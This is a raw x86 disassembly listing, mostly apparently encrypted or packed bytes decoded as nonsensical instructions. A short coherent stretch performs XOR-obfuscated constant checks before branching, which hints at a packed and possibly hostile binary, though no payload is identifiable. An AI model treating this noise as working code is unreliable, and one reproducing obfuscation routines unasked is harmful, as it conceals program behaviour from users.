  40e562:	fbstp  TBYTE PTR [ebx+0x4a]
  40e565:	int3   
  40e566:	sbb    eax,0x408fcb00
  40e56b:	cmp    eax,0x9464e184
  40e570:	xor    BYTE PTR [edi+edx*2+0xe],al
  40e574:	mov    WORD PTR [eax+0x583d0e77],?
  40e57a:	push   es
  40e57b:	sbb    dh,BYTE PTR [edi+eax*8]
  40e57e:	loopne 0x40e5b8
  40e580:	ins    BYTE PTR es:[edi],dx
  40e581:	cmp    eax,0xe6d2a4
  40e587:	dec    ecx
  40e588:	fs jb  0x40e51c
  40e58b:	push   ss
  40e58c:	mov    ds:0x91e42c89,al
  40e591:	pushf  
  40e592:	fdiv   DWORD PTR [esi]
  40e594:	push   0xffffffe5
  40e596:	es push ss
  40e598:	inc    ebx
  40e599:	mov    eax,ds:0xd8ffe82e
  40e59e:	and    al,0xfc
  40e5a0:	xor    eax,0x80d10a6a
  40e5a5:	dec    ebp
  40e5a6:	push   ss
  40e5a7:	lds    ecx,FWORD PTR [ecx]
  40e5a9:	add    DWORD PTR [ecx+0x5b],esp
  40e5ac:	add    al,0x62
  40e5ae:	and    dl,ch
  40e5b0:	sti    
  40e5b1:	jnp    0x40e5d1
  40e5b3:	fsubr  st,st(3)
  40e5b5:	push   cs
  40e5b6:	add    al,0x78
  40e5b8:	test   al,0xc
  40e5ba:	popf   
  40e5bb:	fucomi st,st(1)
  40e5bd:	daa    
  40e5be:	pop    ebx
  40e5bf:	cwde   
  40e5c0:	inc    ebx
  40e5c1:	xor    ebx,DWORD PTR [ecx-0x35320fa2]
  40e5c7:	pop    es
  40e5c8:	xor    BYTE PTR [ecx],dl
  40e5ca:	jge    0x40e5c2
  40e5cc:	pop    edx
  40e5cd:	xor    dh,ah
  40e5cf:	xchg   dh,ch
  40e5d1:	shr    esi,1
  40e5d3:	jmp    0xfb144216
  40e5d8:	and    al,0xa5
  40e5da:	ss out dx,al
  40e5dc:	jne    0x40e567
  40e5de:	inc    edi
  40e5df:	adc    edi,esp
  40e5e1:	mov    ebx,0x93847562
  40e5e6:	xchg   edi,eax
  40e5e7:	dec    ecx
  40e5e8:	jae    0x40e5be
  40e5ea:	lock dec edi
  40e5ec:	cmp    dh,bl
  40e5ee:	lahf   
  40e5ef:	ror    DWORD PTR [ebx+0x78514375],cl
  40e5f5:	xlat   BYTE PTR ds:[ebx]
  40e5f6:	popa   
  40e5f7:	lds    ecx,FWORD PTR [edi]
  40e5f9:	mov    WORD PTR [ebx],es
  40e5fb:	cdq    
  40e5fc:	rcr    BYTE PTR [esi+0x41],0x5a
  40e600:	mov    esp,0x8e1a5ea7
  40e605:	dec    esi
  40e606:	jl     0x40e60d
  40e608:	cld    
  40e609:	cdq    
  40e60a:	mov    bh,0xf5
  40e60c:	lahf   
  40e60d:	out    0x73,eax
  40e60f:	fisttp DWORD PTR ds:0xa831bd3
  40e615:	pop    ebp
  40e616:	adc    DWORD PTR [esi+0x3273de3],ecx
  40e61c:	mov    eax,0x5132035c
  40e621:	ja     0x40e66b
  40e623:	fsubr  DWORD PTR [ebx+0x3def1969]
  40e629:	sub    eax,0x82867167
  40e62e:	ja     0x40e659
  40e630:	idiv   DWORD PTR [edi+edi*1-0x7addb130]
  40e637:	es ffreep st(2)
  40e63a:	fs jnp 0x40e63c
  40e63d:	mov    ds,WORD PTR [ebp-0x56]
  40e640:	jns    0x40e62d
  40e642:	dec    esi
  40e643:	cmp    eax,0x81bf7023
  40e648:	es adc al,0x66
  40e64b:	xchg   ecx,eax
  40e64c:	das    
  40e64d:	adc    eax,0xf5fcd890
  40e652:	push   edx
  40e653:	mov    ecx,0xe8afe2d0
  40e658:	ret    0xd5d2
  40e65b:	xchg   esi,eax
  40e65c:	cmp    BYTE PTR [eax-0x6e7f95ed],dh
  40e662:	pushf  
  40e663:	dec    ecx
  40e664:	fimul  DWORD PTR [edi+0x2d]
  40e667:	loopne 0x40e6ac
  40e669:	shr    ebp,0x45
  40e66c:	inc    edi
  40e66d:	sub    eax,0x2c6436f5
  40e672:	ret    0x6c90
  40e675:	mov    ebp,0x1273e960
  40e67a:	add    DWORD PTR [esi+ebp*8+0x79f2a17c],0x5f086c72
  40e685:	jnp    0x40e647
  40e687:	iret   
  40e688:	retf   0x7442
  40e68b:	jmp    0x2155:0xb3cc0818
  40e692:	in     al,dx
  40e693:	xchg   ecx,eax
  40e694:	sub    dl,BYTE PTR [edi]
  40e696:	sbb    BYTE PTR [edx-0x7292cca8],al
  40e69c:	jne    0x40e677
  40e69e:	cmp    dh,BYTE PTR [edi+0xe]
  40e6a1:	and    ebp,eax
  40e6a3:	test   BYTE PTR [eax],bh
  40e6a5:	out    0x63,al
  40e6a7:	(bad)  
  40e6a8:	cld    
  40e6a9:	test   eax,0x3e073192
  40e6ae:	fisubr DWORD PTR [edi+edx*2-0x372b590d]
  40e6b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6b6:	mov    edi,0xa9248098
  40e6bb:	jl     0x40e689
  40e6bd:	mov    esi,edx
  40e6bf:	push   cs
  40e6c0:	dec    ebp
  40e6c1:	xchg   esi,eax
  40e6c2:	push   esi
  40e6c3:	pop    eax
  40e6c4:	mov    ah,0xac
  40e6c6:	xlat   BYTE PTR ds:[ebx]
  40e6c7:	test   DWORD PTR ds:0xd259e520,esi
  40e6cd:	sbb    eax,DWORD PTR [edi+edx*8-0x59]
  40e6d1:	adc    BYTE PTR [edi-0x19999f78],bl
  40e6d7:	xchg   edx,eax
  40e6d8:	sub    al,0xf1
  40e6da:	sub    DWORD PTR [ebp-0x38775469],esi
  40e6e0:	inc    eax
  40e6e1:	xlat   BYTE PTR ds:[ebx]
  40e6e2:	gs sub esi,edx
  40e6e5:	lock add eax,ebp
  40e6e8:	and    ecx,DWORD PTR [ebp-0x7024a3c0]
  40e6ee:	dec    esp
  40e6ef:	sbb    DWORD PTR [ebx-0x4f],eax
  40e6f2:	cs pusha 
  40e6f4:	push   edi
  40e6f5:	jnp    0x40e68f
  40e6f7:	jo     0x40e769
  40e6f9:	sahf   
  40e6fa:	es ins BYTE PTR es:[edi],dx
  40e6fc:	sbb    al,0x1e
  40e6fe:	(bad)  
  40e6ff:	mov    ecx,0xdbc2f434
  40e704:	adc    ecx,DWORD PTR [ebp-0x68]
  40e707:	add    ah,BYTE PTR [edx]
  40e709:	lea    ebx,[eax+0x73a814b2]
  40e70f:	push   eax
  40e710:	js     0x40e784
  40e712:	repnz cdq 
  40e714:	loop   0x40e6c5
  40e716:	cmp    al,0xf5
  40e718:	sbb    DWORD PTR [ecx-0x49cfa956],esi
  40e71e:	in     eax,0x67
  40e720:	jae    0x40e704
  40e722:	hlt    
  40e723:	into   
  40e724:	mov    eax,ds:0x5c8215f7
  40e729:	outs   dx,BYTE PTR ds:[esi]
  40e72a:	mov    cl,0x8
  40e72c:	xor    eax,0x13da7f43
  40e731:	rol    DWORD PTR ds:0x6103c68d,0x88
  40e738:	xchg   ecx,eax
  40e739:	fmul   DWORD PTR [eax+0x7e75446e]
  40e73f:	dec    ebp
  40e740:	adc    eax,0x5ad77b79
  40e745:	call   0xe3855ae0
  40e74a:	loope  0x40e750
  40e74c:	mov    esp,0xa1051f4d
  40e751:	dec    edi
  40e752:	xchg   edx,eax
  40e753:	gs push eax
  40e755:	mov    bl,0xe3
  40e757:	mov    ds:0xc03cf89e,al
  40e75c:	dec    esi
  40e75d:	mov    WORD PTR [eax],fs
  40e75f:	push   es
  40e760:	jb     0x40e74e
  40e762:	idiv   BYTE PTR [edi+eiz*8+0x76]
  40e766:	(bad)  
  40e767:	push   ss
  40e768:	(bad)  
  40e769:	popf   
  40e76a:	jbe    0x40e715
  40e76c:	aaa    
  40e76d:	and    eax,0xcc02ba28
  40e772:	mov    BYTE PTR [edx+ebx*2],ah
  40e775:	shr    DWORD PTR [ecx],0x1f
  40e778:	add    esi,DWORD PTR [esi]
  40e77a:	cmp    al,ah
  40e77c:	push   es
  40e77d:	inc    ecx
  40e77e:	mov    bl,0xce
  40e780:	mov    dl,0x46
  40e782:	sbb    eax,0x68748027
  40e787:	add    BYTE PTR [ebx+0x77304541],dl
  40e78d:	es ret 
  40e78f:	jge    0x40e78a
  40e791:	push   eax
  40e792:	ret    0xabe3
  40e795:	cmp    cl,ah
  40e797:	sub    eax,0xc8760cb9
  40e79c:	jg     0x40e792
  40e79e:	cmovg  ecx,DWORD PTR [ebx+0x5e9cc13e]
  40e7a5:	xchg   edx,eax
  40e7a6:	popa   
  40e7a7:	jnp    0x40e7d9
  40e7a9:	dec    eax
  40e7aa:	loop   0x40e747
  40e7ac:	push   eax
  40e7ad:	push   esi
  40e7ae:	loopne 0x40e80b
  40e7b0:	sbb    DWORD PTR [edx+0x53],edx
  40e7b3:	and    BYTE PTR [ebp+0xcef75fe],bh
  40e7b9:	mov    esi,0xb21c339
  40e7be:	and    al,0x83
  40e7c0:	inc    esi
  40e7c1:	xor    eax,0x685d7d73
  40e7c6:	sti    
  40e7c7:	fadd   DWORD PTR [esi-0x53]
  40e7ca:	out    dx,eax
  40e7cb:	xchg   ebx,eax
  40e7cc:	cli    
  40e7cd:	scas   al,BYTE PTR es:[edi]
  40e7ce:	adc    al,0x25
  40e7d0:	fisub  WORD PTR [ecx+ebp*1-0x30ede1f7]
  40e7d7:	sub    eax,0x2d4ef52
  40e7dc:	gs xchg ebx,eax
  40e7de:	into   
  40e7df:	leave  
  40e7e0:	arpl   WORD PTR [esi+0x2d662e2d],cx
  40e7e6:	jp     0x40e85b
  40e7e8:	ins    DWORD PTR es:[edi],dx
  40e7e9:	xchg   BYTE PTR [eax+0x64],dl
  40e7ec:	in     eax,0x96
  40e7ee:	mov    edx,0xe53cc00f
  40e7f3:	popf   
  40e7f4:	and    dl,BYTE PTR [ebx]
  40e7f6:	lods   eax,DWORD PTR ds:[esi]
  40e7f7:	mov    ebp,0xab55f7e5
  40e7fc:	in     eax,0xf0
  40e7fe:	inc    esp
  40e7ff:	hlt    
  40e800:	sbb    ecx,DWORD PTR [edi+0x7eb0c706]
  40e806:	mov    ecx,0x69076f9f
  40e80b:	out    dx,al
  40e80c:	push   0x2b
  40e80e:	fist   DWORD PTR [ebx-0x696f2c10]
  40e814:	(bad)  
  40e815:	and    DWORD PTR ds:0xf4c4a0aa,edx
  40e81b:	pop    eax
  40e81c:	jmp    0x1ec3a3a8
  40e821:	int3   
  40e822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e823:	pop    edx
  40e824:	aaa    
  40e825:	xchg   edx,eax
  40e826:	pop    eax
  40e827:	fcmove st,st(3)
  40e829:	and    al,0x65
  40e82b:	lahf   
  40e82c:	ret    0x7dcf
  40e82f:	stos   DWORD PTR es:[edi],eax
  40e830:	lock adc BYTE PTR [ebx-0x5aa0b225],ch
  40e837:	lods   eax,DWORD PTR ds:[esi]
  40e838:	mov    ds:0x70455638,al
  40e83d:	jp     0x40e8b0
  40e83f:	add    ch,bl
  40e841:	pushf  
  40e842:	scas   eax,DWORD PTR es:[edi]
  40e843:	sub    eax,0xcc28871e
  40e848:	pop    edi
  40e849:	push   esp
  40e84a:	add    eax,0x34f6f748
  40e84f:	fcmovnu st,st(5)
  40e851:	cmc    
  40e852:	cmp    cl,dh
  40e854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e855:	push   eax
  40e856:	jne    0x40e88a
  40e858:	call   0xa7e2:0xf2045fb9
  40e85f:	xchg   ebp,eax
  40e860:	pop    edi
  40e861:	(bad)  [esi+eax*1-0x49]
  40e865:	or     DWORD PTR [ebp-0x2a],edi
  40e868:	fstp   TBYTE PTR [edi+0x2a49eb1b]
  40e86e:	xchg   edx,eax
  40e86f:	js     0x40e89e
  40e871:	sub    esp,DWORD PTR [ecx+0x709bfe8b]
  40e877:	xchg   ecx,eax
  40e878:	pop    ebp
  40e879:	xchg   esi,eax
  40e87a:	bound  edx,QWORD PTR [ecx]
  40e87c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e87d:	sub    al,0xcf
  40e87f:	sub    DWORD PTR [ebp+0x13],eax
  40e882:	ret    0xd469
  40e885:	shl    DWORD PTR [ecx+0x4d224f72],cl
  40e88b:	ret    
  40e88c:	imul   eax,DWORD PTR [ebx+0x19980399],0x194389ef
  40e896:	test   DWORD PTR [ebx],eax
  40e898:	push   DWORD PTR [ecx+0x4d8b4c9e]
  40e89e:	loopne 0x40e82b
  40e8a0:	xor    eax,0x4344d5
  40e8a5:	mov    esi,DWORD PTR [esi]
  40e8a7:	xor    DWORD PTR ds:0x43441e,esi
  40e8ad:	mov    esi,0x7510855
  40e8b2:	xor    DWORD PTR ds:0x434422,0x43276c
  40e8bc:	xor    eax,esi
  40e8be:	add    eax,ebx
  40e8c0:	mov    DWORD PTR ds:0x432e42,0x3895
  40e8ca:	cmp    ecx,eax
  40e8cc:	mov    DWORD PTR ds:0x434491,0xed9
  40e8d6:	je     0x40fd3a
  40e8dc:	push   DWORD PTR [ebp-0x20]
  40e8df:	adc    DWORD PTR ds:0x432e42,0x432778
  40e8e9:	push   DWORD PTR [ebp+0x8]
  40e8ec:	call   0x404cd4
  40e8f1:	jmp    0x40ece5
  40e8f6:	ret    
  40e8f7:	rcr    BYTE PTR [ebp-0x67],1
  40e8fa:	popa   
  40e8fb:	cdq    
  40e8fc:	ret    
  40e8fd:	xor    WORD PTR [eax],0xffa7
  40e901:	fisub  DWORD PTR [edi+0x2bbeecc5]
  40e907:	call   0x7070:0x7d497070
  40e90e:	push   edx
  40e90f:	pop    ss
  40e910:	or     bh,BYTE PTR [edi+0x64]
  40e913:	inc    eax
  40e914:	addr16 pop eax
  40e916:	repnz mov cl,0x6c
  40e919:	mov    BYTE PTR [esi-0x37d576fe],bl
  40e91f:	xchg   DWORD PTR [esi+0x64a13c90],ebx
  40e925:	push   0x4266d634
  40e92a:	mov    DWORD PTR [esi],edx
  40e92c:	sub    edi,esp
  40e92e:	push   edi
  40e92f:	(bad)  [ecx+0x1b]
  40e932:	mov    BYTE PTR [ebx+0x4970e81b],dh
  40e938:	xchg   edi,edx
  40e93a:	aad    0xdc
  40e93c:	jo     0x40e953
  40e93e:	mov    esi,0xd55bc35b
  40e943:	sbb    al,0x4f
  40e945:	mov    ebx,es
  40e947:	btr    DWORD PTR [esi-0x109b237f],esp
  40e94e:	mov    ?,WORD PTR [edi+0x64]
  40e951:	mov    DWORD PTR ds:0xdd6f2dc,ecx
  40e957:	mov    esp,0x720f192a
  40e95c:	xchg   ebp,eax
  40e95d:	push   es
  40e95e:	push   es
  40e95f:	leave  
  40e960:	(bad)  
  40e961:	pop    ebx
  40e962:	mov    bl,0xaf
  40e964:	ins    DWORD PTR es:[edi],dx
  40e965:	add    eax,ecx
  40e967:	sti    
  40e968:	jge    0x40e9de
  40e96a:	repnz dec edi
  40e96c:	shl    DWORD PTR [ecx],0xe3
  40e96f:	sub    dh,dl
  40e971:	dec    eax
  40e972:	imul   eax,DWORD PTR [ebp+0x43],0xfcadeed1
  40e979:	arpl   WORD PTR [ebx],cx
  40e97b:	adc    eax,0xe218de1c
  40e980:	lock int3 
  40e982:	int3   
  40e983:	stos   DWORD PTR es:[edi],eax
  40e984:	shl    BYTE PTR [edx+edx*4+0x5b],1
  40e988:	push   cs
  40e989:	je     0x40e95e
  40e98b:	pop    ebp
  40e98c:	into   
  40e98d:	std    
  40e98e:	fisubr WORD PTR [edx-0x45]
  40e991:	lods   eax,DWORD PTR ds:[esi]
  40e992:	mov    eax,ds:0xdfb0058e
  40e997:	es stos DWORD PTR es:[edi],eax
  40e999:	jno    0x40e983
  40e99b:	push   edx
  40e99c:	mov    ecx,0x7ecab3c6
  40e9a1:	jl     0x40e9f7
  40e9a3:	inc    esp
  40e9a4:	cmp    esp,DWORD PTR [esi]
  40e9a6:	cli    
  40e9a7:	adc    ebx,DWORD PTR [eax-0x25deb462]
  40e9ad:	xor    al,0x8a
  40e9af:	popa   
  40e9b0:	push   cs
  40e9b1:	inc    ebx
  40e9b2:	dec    eax
  40e9b3:	bound  ebp,QWORD PTR [ebp+0x34]
  40e9b6:	in     al,0x2e
  40e9b8:	push   cs
  40e9b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9ba:	jno    0x40e9a4
  40e9bc:	mov    DWORD PTR [eax-0x8],eax
  40e9bf:	out    dx,eax
  40e9c0:	out    dx,al
  40e9c1:	sub    esi,DWORD PTR [ebx+0x2a]
  40e9c4:	mov    cl,0x1
  40e9c6:	or     al,0x9e
  40e9c8:	(bad)  
  40e9c9:	loop   0x40ea2c
  40e9cb:	stc    
  40e9cc:	sbb    DWORD PTR [ebp+0x50259cba],esi
  40e9d2:	xchg   esi,eax
  40e9d3:	inc    eax
  40e9d4:	push   edi
  40e9d5:	(bad)  
  40e9d6:	lds    eax,FWORD PTR [ebp-0x742b97ff]
  40e9dc:	adc    ebp,DWORD PTR [edi]
  40e9de:	xchg   ebp,eax
  40e9df:	test   al,0x3
  40e9e1:	fisub  DWORD PTR [ebp-0x43edffb7]
  40e9e7:	dec    edx
  40e9e8:	in     al,dx
  40e9e9:	push   esi
  40e9ea:	ds push eax
  40e9ec:	fcmovu st,st(7)
  40e9ee:	sbb    bh,BYTE PTR [edi+0x6a]
  40e9f1:	cmp    ch,BYTE PTR [ebp+ebp*8+0x5f5fd5ed]
  40e9f8:	loopne 0x40e988
  40e9fa:	add    al,0xef
  40e9fc:	cwde   
  40e9fd:	add    DWORD PTR [ecx-0x2d],esp
  40ea00:	dec    edx
  40ea01:	jg     0x40ea00
  40ea03:	call   0x5a15:0x51307fd8
  40ea0a:	cmc    
  40ea0b:	out    0x32,eax
  40ea0d:	and    dh,dh
  40ea0f:	add    ecx,DWORD PTR [eax]
  40ea11:	adc    eax,DWORD PTR [esi+0x59]
  40ea14:	sbb    al,0x7c
  40ea16:	push   0xa66778e9
  40ea1b:	stc    
  40ea1c:	cmc    
  40ea1d:	mov    bh,BYTE PTR [ecx-0x62167a6b]
  40ea23:	and    DWORD PTR [esi],ebp
  40ea25:	jecxz  0x40ea54
  40ea27:	sub    BYTE PTR [eax-0x6e],al
  40ea2a:	repz mov dh,0xcf
  40ea2d:	jne    0x40ea1b
  40ea2f:	xchg   esi,eax
  40ea30:	pop    ecx
  40ea31:	jo     0x40ea67
  40ea33:	push   0x21
  40ea35:	aas    
  40ea36:	cmp    BYTE PTR [ecx+eiz*2-0x28],0x40
  40ea3b:	iret   
  40ea3c:	cs pusha 
  40ea3e:	add    BYTE PTR [edi+0x6ea9a168],al
  40ea44:	push   esi
  40ea45:	xor    BYTE PTR [eax+0x2c],dh
  40ea48:	add    eax,edi
  40ea4a:	pop    eax
  40ea4b:	jl     0x40eaa9
  40ea4d:	and    eax,0x3db14ea4
  40ea52:	rcl    ch,cl
  40ea54:	lods   eax,DWORD PTR ds:[esi]
  40ea55:	mov    esi,0xaed41a46
  40ea5a:	aas    
  40ea5b:	cmp    al,ah
  40ea5d:	cmp    al,0xa0
  40ea5f:	loop   0x40ea7f
  40ea61:	in     eax,0xef
  40ea63:	xor    DWORD PTR [edi],edi
  40ea65:	push   0x5d0faac8
  40ea6a:	or     esi,edx
  40ea6c:	dec    esp
  40ea6d:	push   eax
  40ea6e:	pop    ebx
  40ea6f:	jg     0x40ea47
  40ea71:	mov    bl,0xda
  40ea73:	jg     0x40eacd
  40ea75:	aaa    
  40ea76:	call   FWORD PTR [eax+0x4a]
  40ea79:	aam    0x8c
  40ea7b:	(bad)  
  40ea7c:	fistp  QWORD PTR [edi+0x74]
  40ea7f:	xchg   edx,eax
  40ea80:	mov    WORD PTR [eax],?
  40ea82:	lds    eax,FWORD PTR [ebx]
  40ea84:	push   edi
  40ea85:	aad    0x3d
  40ea87:	add    al,0xb1
  40ea89:	xor    eax,esp
  40ea8b:	jne    0x40eb01
  40ea8d:	sub    al,0x8e
  40ea8f:	or     eax,0x8e0cfe54
  40ea94:	push   esi
  40ea95:	dec    ebx
  40ea96:	ss xchg edx,eax
  40ea98:	xchg   esi,eax
  40ea99:	scas   al,BYTE PTR es:[edi]
  40ea9a:	and    edx,DWORD PTR [edi+0x5dba31d2]
  40eaa0:	leave  
  40eaa1:	jg     0x40eaa0
  40eaa3:	in     eax,0x4d
  40eaa5:	xor    eax,0x749a7806
  40eaaa:	daa    
  40eaab:	jmp    0x40ea5a
  40eaad:	icebp  
  40eaae:	adc    BYTE PTR [edi-0x4e],bl
  40eab1:	je     0x40ea40
  40eab3:	repz fild DWORD PTR [edi-0x5f1ee04c]
  40eaba:	loopne 0x40eb14
  40eabc:	push   edi
  40eabd:	sub    eax,0x7d4b3953
  40eac2:	dec    ebp
  40eac3:	mov    bh,0x3d
  40eac5:	std    
  40eac6:	dec    eax
  40eac7:	int    0xb7
  40eac9:	jge    0x40ea89
  40eacb:	in     eax,0xa
  40eacd:	cmp    ebx,DWORD PTR [esi]
  40eacf:	fstp   TBYTE PTR [ecx]
  40ead1:	and    al,0xc0
  40ead3:	or     ah,BYTE PTR [ebp-0x4]
  40ead6:	add    DWORD PTR [esi-0x65],eax
  40ead9:	mov    ds:0x284a5bf8,eax
  40eade:	push   esi
  40eadf:	into   
  40eae0:	scas   al,BYTE PTR es:[edi]
  40eae1:	(bad)  
  40eae2:	es xor eax,0xe7cf1d26
  40eae8:	push   0xab27925e
  40eaed:	sbb    al,0x6b
  40eaef:	mov    ebp,0xf6bda251
  40eaf4:	or     eax,0x6a49fe05
  40eaf9:	in     eax,0x34
  40eafb:	mov    ds:0xc5d2a1f9,eax
  40eb00:	ins    DWORD PTR es:[edi],dx
  40eb01:	xor    ah,BYTE PTR [ebp+0x12]
  40eb04:	mov    al,ds:0x8f39efa7
  40eb09:	push   esi
  40eb0a:	xchg   DWORD PTR [ebp-0x44],edx
  40eb0d:	shr    ecx,0x73
  40eb10:	inc    edi
  40eb11:	aad    0x18
  40eb13:	inc    esp
  40eb14:	into   
  40eb15:	and    dl,BYTE PTR [esi+0x5e]
  40eb18:	xchg   esi,eax
  40eb19:	ficom  WORD PTR [ebx]
  40eb1b:	sub    al,0xaa
  40eb1d:	pop    esp
  40eb1e:	mov    edx,0x71d5d509
  40eb23:	push   ebx
  40eb24:	(bad)  
  40eb25:	call   0xbe69b257
  40eb2a:	mov    ecx,DWORD PTR [esp+eiz*2]
  40eb2d:	cmp    al,0xde
  40eb2f:	pushf  
  40eb30:	jmp    0xa4db:0x8f95e7a7
  40eb37:	dec    ecx
  40eb38:	sub    edi,DWORD PTR [ebx]
  40eb3a:	aas    
  40eb3b:	xor    cl,dl
  40eb3d:	or     DWORD PTR [esp+ecx*4+0x53370bff],ecx
  40eb44:	xchg   DWORD PTR [edx],ebp
  40eb46:	rcl    BYTE PTR [esp+edx*2],1
  40eb49:	mov    ebp,0xd1d91cc4
  40eb4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb4f:	fsubr  DWORD PTR [esi]
  40eb51:	scas   eax,DWORD PTR es:[edi]
  40eb52:	leave  
  40eb53:	lahf   
  40eb54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb55:	hlt    
  40eb56:	in     al,0x9e
  40eb58:	rcl    ebp,1
  40eb5a:	inc    esi
  40eb5b:	in     al,0x28
  40eb5d:	dec    ebx
  40eb5e:	xor    eax,0xa7a8d499
  40eb63:	out    0x7b,al
  40eb65:	fcmove st,st(3)
  40eb67:	into   
  40eb68:	adc    bl,bh
  40eb6a:	mov    ss,WORD PTR [ebx-0x33d4ae56]
  40eb70:	popa   
  40eb71:	out    dx,al
  40eb72:	out    0x7c,eax
  40eb74:	scas   eax,DWORD PTR es:[edi]
  40eb75:	jge    0x40eb3e
  40eb77:	xchg   edx,eax
  40eb78:	xor    edi,DWORD PTR [edi-0x49]
  40eb7b:	push   eax
  40eb7c:	into   
  40eb7d:	add    al,0xc0
  40eb7f:	aam    0x16
  40eb81:	cli    
  40eb82:	retf   0x729c
  40eb85:	sub    esi,DWORD PTR gs:[esi-0x3e]
  40eb89:	fwait
  40eb8a:	out    0x82,eax
  40eb8c:	sbb    dl,BYTE PTR [ebp-0x42698c01]
  40eb92:	jae    0x40eb52
  40eb94:	retf   
  40eb95:	xchg   edx,eax
  40eb96:	mov    esi,0x8930485f
  40eb9b:	lahf   
  40eb9c:	jmp    0x40eb97
  40eb9e:	sar    al,cl
  40eba0:	sub    BYTE PTR [eax+0x7f2fa076],dh
  40eba6:	add    BYTE PTR [edi],ch
  40eba8:	mov    ebx,0x82a65d75
  40ebad:	std    
  40ebae:	mov    dl,0xcb
  40ebb0:	and    esp,DWORD PTR [edx]
  40ebb2:	inc    edx
  40ebb3:	retf   0xc402
  40ebb6:	jmp    0x6052:0xd53b0294
  40ebbd:	cmp    eax,0xd4a306f4
  40ebc2:	jg     0x40eb79
  40ebc4:	fild   QWORD PTR [ecx-0x3e10fa5d]
  40ebca:	xchg   edi,eax
  40ebcb:	call   0x8c83:0xf32171f1
  40ebd2:	fincstp 
  40ebd4:	push   ebx
  40ebd5:	pushf  
  40ebd6:	jecxz  0x40ec0d
  40ebd8:	sti    
  40ebd9:	cmp    DWORD PTR [eax-0x3b10635c],esi
  40ebdf:	mov    bl,0xe4
  40ebe1:	inc    eax
  40ebe2:	inc    esp
  40ebe3:	mov    ebx,ebp
  40ebe5:	pop    eax
  40ebe6:	out    0xa5,al
  40ebe8:	push   0xffffff95
  40ebea:	(bad)  
  40ebeb:	div    BYTE PTR [ecx-0xfbef1a8]
  40ebf1:	jbe    0x40eb91
  40ebf3:	jmp    0x1a9e:0xbf931184
  40ebfa:	xchg   BYTE PTR ds:[esi],bh
  40ebfd:	push   esp
  40ebfe:	xchg   esi,eax
  40ebff:	stos   BYTE PTR es:[edi],al
  40ec00:	adc    al,0x6b
  40ec02:	push   ss
  40ec03:	test   eax,0xde9ec417
  40ec08:	push   ecx
  40ec09:	push   0x2ab56f1d
  40ec0e:	call   0x8412:0x6578c806
  40ec15:	mov    dh,0x99
  40ec17:	mov    eax,0x47a2c0b0
  40ec1c:	push   0x3c
  40ec1e:	mov    ds:0x54dab6a7,eax
  40ec23:	daa    
  40ec24:	inc    esi
  40ec25:	jmp    0x542e:0xbef6d7e0
  40ec2c:	push   esp
  40ec2d:	mov    ah,BYTE PTR [ebx-0x23]
  40ec30:	jnp    0x40ec61
  40ec32:	dec    edi
  40ec33:	js     0x40eca3
  40ec35:	pushf  
  40ec36:	push   esi
  40ec37:	inc    edx
  40ec38:	adc    bh,dh
  40ec3a:	stos   BYTE PTR es:[edi],al
  40ec3b:	ds add eax,0xbf3fe20a
  40ec41:	pop    ebx
  40ec42:	adc    esp,DWORD PTR [eax+ebp*1+0x30ef2038]
  40ec49:	pop    edx
  40ec4a:	scas   al,BYTE PTR es:[edi]
  40ec4b:	xchg   edx,eax
  40ec4c:	jmp    0xa92a5174
  40ec51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec52:	xchg   esi,eax
  40ec53:	imul   ecx,DWORD PTR [eax-0x76],0xee7c9ee4
  40ec5a:	xor    eax,0x35a3c752
  40ec5f:	int    0x1b
  40ec61:	test   eax,0xc6c820ca
  40ec66:	mov    ds:0xf222e074,eax
  40ec6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec6c:	aaa    
  40ec6d:	xor    esp,DWORD PTR [edx]
  40ec6f:	sbb    al,0x7
  40ec71:	push   ecx
  40ec72:	pusha  
  40ec73:	imul   ebp,DWORD PTR [eax-0x63a56d25],0x4c
  40ec7a:	xor    DWORD PTR [esi+esi*1-0x26fe4ea7],ebp
  40ec81:	es (bad) 
  40ec83:	mov    BYTE PTR [eax+0x4f],ch
  40ec86:	or     eax,0x8616cf7a
  40ec8b:	push   0xffffff96
  40ec8d:	pop    ss
  40ec8e:	mov    ah,0xd3
  40ec90:	mov    ecx,0xc0abe4d6
  40ec95:	icebp  
  40ec96:	adc    DWORD PTR [esi],ecx
  40ec98:	push   esi
  40ec99:	mov    eax,ds:0x9a44b277
  40ec9e:	dec    edi
  40ec9f:	xor    ebp,eax
  40eca1:	lock adc dl,dl
  40eca4:	jbe    0x40ecf2
  40eca6:	es jg  0x40eca6
  40eca9:	(bad)  
  40ecaa:	clc    
  40ecab:	repnz cli 
  40ecad:	pusha  
  40ecae:	stos   BYTE PTR es:[edi],al
  40ecaf:	or     al,0x7f
  40ecb1:	sub    dh,BYTE PTR [ebp+edi*2+0x4]
  40ecb5:	sub    cl,BYTE PTR [edi-0x2]
  40ecb8:	xor    DWORD PTR [ebp-0x6827e80e],edi
  40ecbe:	mov    ebx,0x4e40a29e
  40ecc3:	mov    bh,0xa3
  40ecc5:	es mov dh,0x5f
  40ecc8:	xchg   edi,eax
  40ecc9:	ins    DWORD PTR es:[edi],dx
  40ecca:	sbb    BYTE PTR [eax-0x29],dh
  40eccd:	cmp    al,0x7c
  40eccf:	imul   edi,DWORD PTR [esi],0x18
  40ecd2:	mov    ds:0xf061002c,al
  40ecd7:	mov    cl,0xe8
  40ecd9:	shl    DWORD PTR [ecx],0x39
  40ecdc:	bound  ecx,QWORD PTR [ebp+0x71076bc7]
  40ece2:	adc    eax,0x4589af36
  40ece7:	in     al,dx
  40ece8:	mov    eax,DWORD PTR [ebp-0x4]
  40eceb:	mov    ecx,DWORD PTR [ebp-0x14]
  40ecee:	xor    eax,esi
  40ecf0:	add    eax,ebx
  40ecf2:	cmp    ecx,eax
  40ecf4:	je     0x40fd3a
  40ecfa:	mov    eax,DWORD PTR [ebp-0x14]
  40ecfd:	mov    eax,DWORD PTR [eax+0x18]
  40ed00:	mov    DWORD PTR [ebp-0x20],eax
  40ed03:	mov    eax,DWORD PTR [ebp-0x14]
